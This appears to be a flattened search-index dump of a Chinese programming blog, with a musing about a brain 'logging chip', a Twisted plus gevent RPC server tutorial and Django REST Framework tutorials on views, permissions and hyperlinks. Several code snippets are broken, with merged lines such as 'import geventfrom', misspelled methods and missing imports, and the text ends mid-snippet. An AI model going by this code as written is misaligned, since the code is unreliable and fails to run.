最近很健忘，今天下午撸代码的时候，基本上每执行一个模块就要将调用函数、执行结果、友好信息等记录到日志系统里。 然后我突然想到，如果生物的大脑有一套日志系统就好了! 数千年后，虽然不知道人类迭代更替得如何，但是到时候的智慧生物只需要读取我们这种远古生物的日志系统，就可以看到这个人(或者动物)的一生。 跟传记一样，像一部电影。 对于我这种极其害怕死了之后被遗忘的动物来说，实在很兴奋。 ","date":"2016-07-16","objectID":"/zh-cn/brain-log-system/:1:1","tags":["Gossip"],"title":"如何大脑有一套日志系统就好了","uri":"/zh-cn/brain-log-system/"},{"categories":["Gossip"],"content":"我是这么细想的 为啥？ 我如果想去了解某个已故的人，如果是名人，辣么可以找到他的传记或者史记等资料等，方式很多。 但如果是不出名并且也没有写自传的习惯的人，辣么我可能会去找他的后裔，然后通过不那么客观的角度来了解那个人。甚至，我可能根本找不到方式去了解这个人。 这对于不容易在历史上留名的人来说不公平。 我觉得每个人都值得被记录下来，平凡的人自然有平凡的人会去在乎，在他死后有渠道去查看他的一生。 咋整？ 在每个人刚出生的时候， 在身体上某个部位，这个部位随年龄递增缩产生的变动不大，在这个部位植入一块芯片。 (最佳选择)这块芯片能否通过某种信号，和大脑产生联系，从而能够自动记录日志。 (次之)如果不能与大脑产生联系，辣么就用手动录入日志。但是手动录入日志的话，可能有哪天我偷懒，或者我忘记了，而错过了关键信息。 这样一段时间(可能是一天，也可能是完成某件事情，或者触发了某个事件，或者未来时间的计数单位)结束，我能够在脑子里(回顾?)记录下我今天进行的行为(甚至可以细化到大脑的活动，产生的思维的记录？) 举个栗子： e.g.( [2016.07.10 16:17 小虚 \u003e 由于写代码时烦躁分心胡思乱想产生了奇怪的想法，并且怕自己健忘，于是在\"简书\"边听着 Adam Levine 的歌边写了一篇名为《如果大脑有一套日志系统就好了》的 blog ] ) 其中记录方式，可能是通过在脑袋里思考时产生的某种信号，解析后在芯片里进行读写… (进入瞎编模式！) 估计实现不了，辣么手工录入日志还是比较容易的！ 虽然这种方式不很便捷。 这就会产生一个问题：芯片容量的问题。 万一遇到话唠型选手咋整？ 一天能整个 10 万字的大新闻。 我一开始的想法是容量尽量大的芯片，但是这样成本高，不如限制字数吧。 正好我喜欢情多话少的 ：D 最后， 在人死后，焚烧之前，取出这块芯片，使用某种储存方式保存起来。 数千年后，人们想了解我，只需要读取这块芯片，就能知道我每一天做了什么，我在想什么… 可能出现的问题 记录日志时带有不真实性。也就是说，你甚至可以胡扯出今天一天做了什么事儿。比如我可以说: 我今天和高圆圆一起去看了《大鱼海棠》，我感到小鹿乱撞。 在婴儿期，还没有成形的意识，以及在老年期，意识不清晰了，无法记录日志，这段时间的日志是空白的。 语言问题。这个好说，现在翻译引擎很屌了。 是否应该允许他人能编辑本人的日志？不应该。 日志系统是个芯片，总有办法被摧毁的，如果遇到恶性事件，那是无可奈何的。 具体如何记录的实现问题。 嗯，就酱！ ","date":"2016-07-16","objectID":"/zh-cn/brain-log-system/:1:2","tags":["Gossip"],"title":"如何大脑有一套日志系统就好了","uri":"/zh-cn/brain-log-system/"},{"categories":["Code","Python"],"content":"背景 最近接触到用 Twisted 来写个 RPC 服务器，对高并发、性能和大量长连接时的稳定性方面有要求，所以应该在 Twisted 的基础上再造些轮子，最后考虑用 Twisted + gevent 来实现 「异步+协程」的部分。 分别简要介绍下 Twisted 和 gevent。 ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:1:0","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"Twisted Twisted是用 Python 实现的基于事件驱动的异步的网络引擎框架。它封装了大部分主流的网络协议(传输层或应用层)，如 TCP、UDP、SSL/TLS、HTTP、IMAP、SSH、IRC以及FTP等，在这我主要会用到 TCP 协议。 使用 Twisted 的好处在于，它是以事件驱动编程实现的，所以提供了事件注册的回调函数的接口，每次接受到请求，获得了事件通知，就调用事件所注册的回调函数( Node.js 程序员可能比较熟悉)。这让我不必去操心服务器事件驱动的编写。 并且，在网络引擎方面，有心跳包和粘包的三方库，非常完善。 然而，Twisted 有一个缺陷，它的异步有点问题，单个连接建立后是一个进程，在进程里用多线程实现并发，但多个连接建立后仍然会出现同步阻塞的情况，所以这就要引入 gevent 来填充其性能上的缺陷。 ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:2:0","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"gevent gevent 是一种基于协程的 Python 网络库，它用到 greenlet 提供的，封装了 libevent 事件循环的高层同步API。 如果你不知道什么是协程，那么可以简单这么理解： 协程就是由程序员自己编码实现调度的多线程。 而 gevent 对 greenlet 协程进行了封装，同时 gevent 提供了看上去非常像传统的基于线程模型编程的接口，但是在隐藏在下面做的是异步 I/O ，所以它以同步的编码实现了异步的功能。 ##开搞 ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:3:0","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"Step 1 完成基础框架 首先由于我要编写一个 RPC 服务器(使用 TCP 协议)，所以需要先实现一个 TCP 服务器。 # server.py from twisted.internet.protocol import ServerFactory, ProcessProtocol from twisted.protocols.basic import LineReceiver from twisted.internet import reactor PORT = 5354 class CmdProtocol(LineReceiver): client_ip = '' # 连接建立接口 def connectionMade(self): # 获得连接对端 ip self.client_ip = self.transport.getPeer().host print(\"Client connection from %s\" % self.client_ip) # 连接断开接口 def connectionLost(self, reason): print('Lost client connection. Reason: %s' % reason) # 数据接收接口 def dataReceived(self, data): print('Cmd received from %s: %s' % (self.client_ip, data)) class RPCFactory(ServerFactory): # 使用 CmdProtocol 与客户端通信 protocol = CmdProtocol # 启动服务器 if __name__ == \"__main__\": reactor.listenTCP(PORT, RPCFactory()) reactor.run() Twisted 提供3个非常基础的接口使程序员进行重写: connectionMade() 连接建立后执行操作 connectionLost() 连接断开后执行操作 dataReceived() 接收到数据后触发操作 这3个接口通常来说是必须的，以此基础上进行完善，可以看到我只是先输出了友好信息。 这样简单完成了一个 TCP 服务器，可以看出 Twisted 网络引擎的架构如下： 先由程序员来制定一个或多个协议(该协议可以继承各种底层网络协议)。 接着指定唯一一个工厂，这个工厂必须声明使用的协议对象。 使用 reactor 选择监听模式、监听工厂和端口，开启服务器。 ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:3:1","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"Step 2 完善基础框架 显然，这个 TCP 服务器基础框架显得有些单薄，我首先想到的是需要进行多客户端的控制及 ip 记录，故应有个队列来实时更新连接入服务器的 ip。 并且，最近有好几部电影在豆瓣我标记了，我想和高圆圆一起去看，所以不能一直盯着屏幕来观察反馈，所以需要一个日志系统来记录反馈信息。 故增加一个 log.py 日志系统文件： # log.py import os import logging import logging.handlers from twisted.python import log #当前执行文件所在地址 CURRENT_PATH = os.getcwd() #日志文件路径 LOG_FILE = CURRENT_PATH + '/rpcserver.log' # 全局日志模块 gl_logger = None class log(Protocol): def init_log(): global gl_logger try: os.makedirs(os.path.dirname(LOG_FILE)) except: pass # 实例化handler handler = logging.handlers.RotatingFileHandler(LOG_FILE, maxBytes=1024 * 1024, backupCount=1) fmt = '[%(asctime)s][%(levelname)s][%(filename)s:%(lineno)d:%(funcName)s] - %(message)s' # 实例化formatter formatter = logging.Formatter(fmt) # 为handler添加formatter handler.setFormatter(formatter) # 获取名为rpcserver的logger gl_logger = logging.getLogger('rpcserver') # 为logger添加handler loggergl_logger.addHandler(handler) handlergl_logger.setLevel(logging.DEBUG) gl_logger.info(\"----------------------------------\") 并在 server.py 中添加如下代码： (添加多连接控制，把 print 替换为 log.msg 来打印日志) # server.py from twisted.internet.protocol import ServerFactory, ProcessProtocol from twisted.protocols.basic import LineReceiver from twisted.internet import reactor from twisted.python import log PORT = 5354 class CmdProtocol(LineReceiver): client_ip = '' # 连接建立接口 def connectionMade(self): # 获得连接对端 ip self.client_ip = self.transport.getPeer().host log.msg(\"Client connection from %s\" % self.client_ip) # 进行多连接控制 if len(self.factory.clients) \u003e= self.factory.clients_max: log.msg(\"Too many connections. Disconnect!\") self.client_ip = None self.transport.loseConnection() else: self.factory.clients.append(self.client_ip) # 连接断开接口 def connectionLost(self, reason): log.msg('Lost client connection. Reason: %s' % reason) if self.client_ip: self.factory.clients.remove(self.client_ip) # 数据接收接口 def dataReceived(self, data): log.msg('Cmd received from %s: %s' % (self.client_ip, data)) class RPCFactory(ServerFactory): # 使用 CmdProtocol 与客户端通信 protocol = CmdProtocol # 设置最大连接数 def __init__(self, clients_max=10): self.clients_max = clients_max self.clients = [] # 启动服务器 if __name__ == \"__main__\": log.startLogging(sys.stdout) reactor.listenTCP(PORT, RPCFactory()) reactor.run() ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:3:2","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"Step 3 增加 rpc 实例 既然是 rpc 服务器，辣么接下来就要实现一个简单的远程命令调用，既然之前写了日志模块，那就写一个对应的远程日志查看调用吧！ 对了，写到这里，已经是 02：53 了，我不知道为什么开始胡思乱想起来。 我想大概是因为越是无端的，越是会心念着… 嗷，跑题了… 远程调用呢， Twisted 提供了一个敲好用的子进程父类 ProcessProtocol 这个类提供了2个接口: outReceived 用来接收和外发数据 processEnded 进程结束回调 于是，我在 server.py 中加入以下代码: # 打印日志 class TailProtocol(ProcessProtocol): def __init__(self, write_callback): self.write = write_callback def outReceived(self, data): self.write(\"Begin logger\\n\") data = [line for line in data.split('\\n') if not line.startswith('==')] for d in data: self.write(d + '\\n') self.write(\"End logger\\n\") def processEnded(self, reason): if reason.value.exitCode != 0: log.msg(reason) 循环读取日志文件中每一行并输出信息。 接着在 CmdProtocol 类中加入以下函数: # 根据 cmd 执行相应操作 def processCmd(self, line): if line.startwith('getlog'): tailProtocol = TailProtocol(self.transport.write) # 打印rpcserver.log日志 reactor.spawnProcess(tailProtocol, '/usr/bin/tail', args=['/usr/bin/tail', '-10', '/var/log/rpcserver.log']) 通过获取远程发送来的命令 「getlog」 触发了以下事件 tailProtocol ，并调用 TailProtocol 类中的回调函数 outReceived 来循环读取日志文件中每一行并输出日志信息，返回给客户端。 同理，其余 RPC 远程调用实例也可类似的编写。 注意，这里使用了 Twisted 自带的 spawnProcess() 来处理事件回调，并新建一个线程来执行函数，这就是单个连接中并发的实现。 ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:3:3","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"Step 4 加入 gevent 协程部分 首先我考虑的是使用一个队列来储存每次接收到事件触发的钩子后，把钩子接收的参数存入队列中，再用 gevent 的协程来进行任务的分发。 直接上代码： # server.py import geventfrom gevent.queue import Queue # 任务队列 tasks = Queue() class CmdProtocol(LineReceiver): def worker(self, target): while not tasks.empty(): task = tasks.get() log.msg('User %sgot task %s' % (target, task)) self.processCmd(task) gevent.sleep(0) def dispatch(self, data): tasks.put_nowait(data) def dataReceived(self, data): log.msg('Cmd received from %s: %s' % (self.client_ip, data)) gevent.spawn(self.dispatch, data).join() gevent.spawn(self.worker, self.client_ip) 首先， gevent 的队列 Queue 有两个主要的方法 get() 和 put() 来对队列中的元素进行读和写。put_nowait() 相当于 put() 的无阻塞模式。 在 dispatch() 中，我把每个收到的 data 的 trigger 放入任务队列中，使其进入等待分发的状态。 接着，协程会执行下一步 worker()从任务队列中取出相应的 trigger ，传入 processCmd 中触发回调，执行相应的函数。 执行完后，协程会回到上一步 dispatch() 接着再到 worker() 这样交替轮循，直到任务列表里的任务全部执行完为止，这个过程中，各个任务执行是独立的，不会造成阻塞，吊！ ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:3:4","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"欧勒！ 就酱，我们撸出了一个高性能的、协程的、异步的 RPC 服务器！ ","date":"2016-07-04","objectID":"/zh-cn/rpc-server/:4:0","tags":["Python","Rpc","Twisted"],"title":"Twisted+gevent 异步+协程服务器开发","uri":"/zh-cn/rpc-server/"},{"categories":["Code","Python"],"content":"关联性和超链接 之前我们的 api 都是用外键关联，然而实际上用超链接的方式更符合 RESTful 的思想。 所以在这一章中我们将要用超链接(代替外键的方式)来提高关联性。 ","date":"2016-04-06","objectID":"/zh-cn/drf-tutorial-5/:1:0","tags":["Python","Django","RESTful"],"title":"Django REST Framework 5-关联性和超链接","uri":"/zh-cn/drf-tutorial-5/"},{"categories":["Code","Python"],"content":"为 api 提供根路径 由于要采用超链接的方式，而之前我们的 ‘movies’ / ‘directors’ / ‘users’ 虽然有了 endpoints ，但 api 本身却没有一个整体的根路径，所以我们使用 @api_view 装饰器来创建一个根路径。 在 douban/views.py 中添加如下代码: from rest_framework.decorators import api_view from rest_framework.response import Response from rest_framework.reverse import reverse # api 根目录 @api_view(['GET']) def api_root(request, format=None): return Response({ 'user': reverse('user-list', request=request, format=format), 'movies': reverse('movies-list', request=request, format=format), 'director': reverse('director-list', request=request, format=format) }) 在这里需要注意两样东西： 我们用了 DRF 的 reverse 方法而不是 Django 自带的 reverse 方法来返回一个正确的 URLs。 此时如果打开 Web api 界面会报错, 因为我们还没有为 url 进行绑定， 稍后我们会添加。 接着在 doubt/urls.py 中添加对应路径 url(r'^$', views.api_root), ","date":"2016-04-06","objectID":"/zh-cn/drf-tutorial-5/:1:1","tags":["Python","Django","RESTful"],"title":"Django REST Framework 5-关联性和超链接","uri":"/zh-cn/drf-tutorial-5/"},{"categories":["Code","Python"],"content":"使用炫酷的超链接 DRF 提供了以下几种方式来处理实体间的关系: 主键 超链接 相关项使用单一标识符 相关项默认文本信息 子项在母项中显示出来 其他方式 在这个栗子中我们使用超链接的方式来处理实体关系。 首先在序列器中使用 HyperlinkedModelSerializer 替代 ModelSerializer 注: HyperlinkedModelSerializer 和 ModelSerializer 有以下几点区别: 它没有主键域 ( pk field ) 它默认包含一个 url 域 关联时使用的是 HyperlinkedRelatedField 而不是 PrimaryKeyRelatedField 在 doubt/serializer.py 中进行如下改写: #!/usr/bin/python # -*- coding: utf-8 -*- from django.contrib.auth.models import User from rest_framework import serializers from douban.models import Movies, celebrity, COUNTRY_CHOICES, TYPE_CHOICES class MoviesSerializer(serializers.HyperlinkedModelSerializer): owner = serializers.ReadOnlyField(source='owner.username') director = serializers.HyperlinkedRelatedField(many=False, queryset=celebrity.objects.all(), view_name='director-detail') class Meta: model = Movies fields = ('id', 'title', 'director', 'year', 'country', 'type', 'rating', 'owner') class UserSerializer(serializers.HyperlinkedModelSerializer): movies = serializers.HyperlinkedRelatedField(many=True, view_name='movies-detail', read_only=True) class Meta: model = User fields = ('id', 'username', 'movies') class DirectorSerializer(serializers.HyperlinkedModelSerializer): movies = serializers.HyperlinkedRelatedField(many=True, view_name='movies-detail') class Meta: model = celebrity fields = ('id', 'name', 'age', 'gender', 'movies') ","date":"2016-04-06","objectID":"/zh-cn/drf-tutorial-5/:1:2","tags":["Python","Django","RESTful"],"title":"Django REST Framework 5-关联性和超链接","uri":"/zh-cn/drf-tutorial-5/"},{"categories":["Code","Python"],"content":"绑定 url 使用超链接 api 有个前提条件，我们需要确保 URL pattern 都已命名。 编辑 douban/urls.py 进行如下修改: #!/usr/bin/python # -*- coding: utf-8 -*- from django.conf.urls import url from rest_framework.urlpatterns import format_suffix_patterns from douban import views urlpatterns = format_suffix_patterns([ url(r'^$', views.api_root), url(r'^movies/$', views.MoviesList.as_view(), name='movies-list'), url(r'^movies/(?P\u003cpk\u003e[0-9]+)/$', views.MoviesDetail.as_view(), name='movies-detail'), url(r'^users/$', views.UserList.as_view(), name='user-list'), url(r'^users/(?P\u003cpk\u003e[0-9]+)/$', views.UserDetail.as_view(), name='user-detail'), url(r'^directors/$', views.DirectorList.as_view(), name='director-list'), url(r'^directors/(?P\u003cpk\u003e[0-9]+)/$', views.DirectorDetail.as_view(), name='director-detail'), ]) 确保每个 URL pattern 都正确的与 views.py 中对应视图的命名进行绑定。 ","date":"2016-04-06","objectID":"/zh-cn/drf-tutorial-5/:1:3","tags":["Python","Django","RESTful"],"title":"Django REST Framework 5-关联性和超链接","uri":"/zh-cn/drf-tutorial-5/"},{"categories":["Code","Python"],"content":"增加分页 对于大量的数据在单页显示体验很不好，所以要设置分页。 编辑 restapit/settings.py : REST_FRAMEWORK = { 'PAGE_SIZE': 10 } 现在用浏览器访问我们的 api 界面，不断地添数据，就可以看到分页效果辣。 ","date":"2016-04-06","objectID":"/zh-cn/drf-tutorial-5/:1:4","tags":["Python","Django","RESTful"],"title":"Django REST Framework 5-关联性和超链接","uri":"/zh-cn/drf-tutorial-5/"},{"categories":["Code","Python"],"content":"为什么使用超链接 因为用超链接的方式有个明确的指向，比如该栗子中 movies 的 director 字段由外键变为超链接的关联形式允许直接跳转到 director 的 api 页面。 ","date":"2016-04-06","objectID":"/zh-cn/drf-tutorial-5/:1:5","tags":["Python","Django","RESTful"],"title":"Django REST Framework 5-关联性和超链接","uri":"/zh-cn/drf-tutorial-5/"},{"categories":["Code","Python"],"content":"验证与授权 目前来看，我们的 API 并没有权限上的限制(即任何人都可以编辑或删除我们的 Movies )，这不是我们想要的。所以我们需要在 API 上做些限制以确保: Movies 与 Users 关联起来。 只有授权了的用户才能创建新的 Movies。 只有 Movies 的创建者才可以更新或删除它。 未授权的用户只能进行查看。 ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:0","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"在 models 中增加以下信息 我们先把之前注释掉的 director = models.ForeignKey('celebrity', related_name='Movies') class celebrity(models.Model): name = models.CharField(max_length=100, blank=True, default='') age = models.IntegerField() gender = models.CharField(choices=GENDER_CHOICES, default='male', max_length=20) 关联导演类的注释解开，来看看多张表在生成的 api 里的关联性。 接着在 models.py 中的 Movies 类中加入以下代码来确定 Movies 的创建者: owner = models.ForeignKey('auth.User', related_name='Movies') 最后 models.py 代码为: #!/usr/bin/python # -*- coding: utf-8 -*- from django.db import models # 举个栗子 COUNTRY_CHOICES = ( ('US', 'US'), ('Asia', 'Asia'), ('CN', 'CN'), ('TW', 'TW'), ) TYPE_CHOICES = ( ('Drama', 'Drama'), ('Thriller', 'Thriller'), ('Sci-Fi', 'Sci-Fi'), ('Romance', 'Romance'), ('Comedy', 'Comedy') ) GENDER_CHOICES = ( ('male', 'male'), ('female', 'female') ) class Movies(models.Model): title = models.CharField(max_length=100, blank=True, default='') year = models.CharField(max_length=20) # 在 director 关联了 Movies 类 和 celecrity 类, 在第4章会用到 celebrity 类 director = models.ForeignKey('celebrity', related_name='movies') # 关联 User 类来确定 Movies 的创建者 owner = models.ForeignKey('auth.User', related_name='movies') country = models.CharField(choices=COUNTRY_CHOICES, default='US', max_length=20) type = models.CharField(choices=TYPE_CHOICES, default='Romance', max_length=20) rating = models.DecimalField(max_digits=3, decimal_places=1) created = models.DateTimeField(auto_now_add=True) class Meta: ordering = ('created',) class celebrity(models.Model): name = models.CharField(max_length=100, blank=True, default='') age = models.IntegerField() gender = models.CharField(choices=GENDER_CHOICES, default='male', max_length=20) 修改完了模型，我们需要更新一下数据表。 通常来讲，我们会创建一个数据库 migration 来更新数据表，但是为了图省事儿，宝宝我索性删了整张 Movies 表直接重建！ 在数据库中删除 douban_movies 表后在终端中执行以下命令: $ python manage.py syncdb 接着我们可能会需要多个 User 来测试 API ，如果之前你没有创建 Django Super User 的话，用以下命令创建: $ python manage.py createsuperuser 然后进入 http://127.0.0.1/admin/ 界面，登录并找到 /user/ 表，然后在里面手动创建 user 并赋予权限。 ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:1","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"为新增的模型增加 endpoints 既然现在我们已经有了 users 模型和 celebrity 模型，那么现在需要做的就是在 serializer.py 中让他们在 API 中展现出来，加入以下代码: class UserSerializer(serializers.ModelSerializer): movies = serializers.PrimaryKeyRelatedField(many=True, queryset=Movies.objects.all()) class Meta: model = User fields = ('id', 'username', 'movies') class DirectorSerializer(serializers.ModelSerializer): movies = serializers.PrimaryKeyRelatedField(many=True, queryset=Movies.objects.all()) class Meta: model = celebrity fields = ('id', 'name', 'age', 'gender', 'movies') 因为我们之前在 models.py 中添加了 owner = models.ForeignKey('auth.User', related_name='movies') 其中 related_name 设置了可以通过 User.movies 来逆向访问到 movies 表。所以在 ModelSerializer 类中我们需要在 fields 中添加一个 movies 来实现逆向访问。同理 DirectorSerializer 类中也进行相应修改。 接着，我们还需要在 views.py 中添加相应的视图。 为 User 添加只读 API ，使用 ListAPIView 和 RetrieveAPIView 为 Director 添加读写 API ，使用 ListCreateAPIView 和 RetrieveUpdateDestroyAPIView class UserList(generics.ListAPIView): queryset = User.objects.all() serializer_class = UserSerializer class UserDetail(generics.RetrieveAPIView): queryset = User.objects.all() serializer_class = UserSerializer class DirectorList(generics.ListCreateAPIView): queryset = celebrity.objects.all() serializer_class = DirectorSerializer class DirectorDetail(generics.RetrieveUpdateDestroyAPIView): queryset = celebrity.objects.all() serializer_class = DirectorSerializer 最后，修改 urls.py 把视图关联起来，在 urlpatterns 中加入以下4个 patterns: urlpatterns = [ url(r'^users/$', views.UserList.as_view()), url(r'^users/(?P\u003cpk\u003e[0-9]+)/$', views.UserDetail.as_view()), url(r'^directors/$', views.DirectorList.as_view()), url(r'^directors/(?P\u003cpk\u003e[0-9]+)/$', views.DirectorDetail.as_view()), ] ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:2","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"把 Movies 和 Director 、 User 关联起来 现在，如果我们新建一部 movie ，那它和 director 还有 user 是没有关联的，因为 director 和 user 信息是通过 request 接收到的，而不是通过序列器接收的，这意味着，数据库中收到 director 和 user 信息是没有(和 movies 存在)外键关系的。 而要让他们发生关系 ，我们的做法是在视图中重写 .perform_create() 方法。 .perform_create() 方法允许我们处理 request 或 requested URL 中的任何信息。 在 MoviesList 和 MoviesDetail 中添加以下代码: def perform_create(self, serializer): serializer.save(owner=self.request.user) 这样 create() 方法就能够在接收到 request.data 时将其传回给序列器里的 owner 和 director 了。 ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:3","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"更新序列器 在视图中重写了 .perform_create() 方法后还需要更新下序列器才能实现他们之间的关联，在 serializer.py 中的 MoviesSerializer 类添加以下代码: owner = serializers.ReadOnlyField(source='owner.username') director = serializers.CharField(source='celebrity.name') 接着在 class Meta 的 fields 中加入 owner 和 director : class Meta: model = Movies fields = ('id', 'title', 'director', 'year', 'country', 'type', 'rating', 'owner') source 关键字负责控制在 fields 中展现的数据的源，它可以指向这个序列器实例的任意一个属性。 对 owner 属性，我们用的是 ReadOnlyField 在确保它始终是只读的，我们也可以用 CharField(read_only=True) 来等效替代，但是我嫌它太长了，其余的 Field 还有诸如 CharField 、 BooleanField 等，你可以在 「这里」查到。 ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:4","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"添加权限 我们希望授权的用户才能新建、更新和删除 movies，所以需要添加权限管理的功能。 DRF 包含了一系列的 permission 类来实现权限管理，你可以在「这里」 查到。 在这个栗子中，我们使用 IsAuthenticatedOrReadOnly 来确保授权的请求得到读写的权限，未授权的请求只有只读权限。 首先，在 views.py 中 import 以下模块: from rest_framework import permissions 接着，在 MoviesList 和 MoviesDetail 中加入以下代码: permission_classes = (permissions.IsAuthenticatedOrReadOnly,) ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:5","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"添加可浏览的授权 api 如果你在浏览器中访问我们的 api Web 界面，你会发现我们没法创建新的 movies 了，因为在上一步我们设置了权限管理。 所以我需要在浏览器中添加用户登录来实现带界面的权限管理。(之所以说带界面是因为可以在终端中直接使用 httpie 来访问 api ) 在 restapi/urls.py 中加入以下代码: urlpatterns += [ url(r'^api-auth/', include('rest_framework.urls', namespace='rest_framework')), ] 这样通过在浏览器中访问 Web api 界面就能在右上角发现一个登录按钮，进行登录授权了。 ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:6","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"对象级权限 之前提到要使 movies 可以被任何人访问，但是只能被创建者编辑，所以需要赋予其游客访问的权限以及创建者编辑权限。 下面我们新建一个 permissions.py 来详细解决这个权限问题: #!/usr/bin/python # -*- coding: utf-8 -*- from rest_framework import permissions class IsOwnerOrReadOnly(permissions.BasePermission): \"\"\" 游客访问权限及创建者编辑权限 \"\"\" def has_object_permission(self, request, view, obj): # 游客权限 if request.method in permissions.SAFE_METHODS: return True # 编辑权限 return obj.owner == request.user 修改 views.py 中 MoviesDetail 的 permission_class : from douban.permissions import IsOwnerOrReadOnly permission_classes = (permissions.IsAuthenticatedOrReadOnly, IsOwnerOrReadOnly,) 终于，我们完成了整个 api 授权的过程！ ","date":"2016-04-04","objectID":"/zh-cn/drf-tutorial-4/:1:7","tags":["Python","Django","RESTful"],"title":"Django REST Framework 4-验证和授权","uri":"/zh-cn/drf-tutorial-4/"},{"categories":["Code","Python"],"content":"基于类的视图 基于类的视图比先前基于函数的视图的可重用性更强，可以更多快好省地 ( DRY )地写出简洁的代码。 ","date":"2016-04-03","objectID":"/zh-cn/drf-tutorial-3/:1:0","tags":["Python","Django","RESTful"],"title":"Django REST Framework 3-基于类的视图","uri":"/zh-cn/drf-tutorial-3/"},{"categories":["Code","Python"],"content":"把 API 用基于类的视图的方式重写 编辑 douban/views.py 进行如下重写 #!/usr/bin/python # -*- coding: utf-8 -*- from douban.models import Movies from douban.serializer import MoviesSerializer from django.http import Http404 from rest_framework.views import APIView from rest_framework.response import Response from rest_framework import status class MoviesList(APIView): \"\"\" 罗列出所有的 Movies 或者 能新建一个 Movies \"\"\" def get(self, request, format=None): movies = Movies.objects.all() serializer = MoviesSerializer(movies, many=True) return Response(serializer.data) def post(self, request, format=None): serializer = MoviesSerializer(data=request.data) if serializer.is_valid(): serializer.save() return Response(serializer.data, status=status.HTTP_201_CREATED) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) class MoviesDetail(APIView): \"\"\" 展示\\更新或删除一个 Movies \"\"\" def get_object(self, pk): try: return Movies.objects.get(pk=pk) except Movies.DoesNotExist: raise Http404 def get(self, request, pk, format=None): movies = self.get_object(pk) serializer = MoviesSerializer(movies) return Response(serializer.data) def put(self, request, pk, format=None): movies = self.get_object(pk) serializer = MoviesSerializer(movies, data=request.data) if serializer.is_valid(): serializer.save() return Response(serializer.data) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) def delete(self, request, pk, format=None): movies = self.get_object(pk) movies.delete() return Response(status=status.HTTP_204_NO_CONTENT) 并更新 douban/urls.py #!/usr/bin/python # -*- coding: utf-8 -*- from django.conf.urls import url from rest_framework.urlpatterns import format_suffix_patterns from douban import views urlpatterns = [ url(r'^dbmovies/$', views.MoviesList.as_view()), url(r'^dbmovies/(?P\u003cpk\u003e[0-9]+)/$', views.MoviesDetail.as_view()), ] urlpatterns = format_suffix_patterns(urlpatterns) 重写完毕！ ","date":"2016-04-03","objectID":"/zh-cn/drf-tutorial-3/:1:1","tags":["Python","Django","RESTful"],"title":"Django REST Framework 3-基于类的视图","uri":"/zh-cn/drf-tutorial-3/"},{"categories":["Code","Python"],"content":"使用 Mixins 使用基于类的视图的一大好处是，我们可以使用各种 mixins DRF 为我们提供了许多现成的 mixins ，方便我们像使用 model-backed API 一样构建 “创建/获取/更新/删除” API. 我们试着使用 Mixins 改写原先的 views GenericAPIView 为我们提供了 views 核心的功能, 而 ListModelMixin 和 CreateModelMixin 为我们提供了 .list() 和 .create() 功能，我们将这些功能与 http 动作的 GET 和 POST 相绑定: from douban.models import Movies from douban.serializer import MoviesSerializer from rest_framework import mixins from rest_framework import generics class MoviesList(mixins.ListModelMixin, mixins.CreateModelMixin, generics.GenericAPIView): queryset = Movies.objects.all() serializer_class = MoviesSerializer def get(self, request, *args, **kwargs): return self.list(request, *args, **kwargs) def post(self, request, *args, **kwargs): return self.create(request, *args, **kwargs) 同样的, 我们使用GenericAPIView, RetrieveModelMixin, UpdateModelMixin和DestroyModelMixin改写views.py: class MoviesDetail(mixins.RetrieveModelMixin, mixins.UpdateModelMixin, mixins.DestroyModelMixin, generics.GenericAPIView): queryset = Movies.objects.all() serializer_class = MoviesSerializer def get(self, request, *args, **kwargs): return self.retrieve(request, *args, **kwargs) def put(self, request, *args, **kwargs): return self.update(request, *args, **kwargs) def delete(self, request, *args, 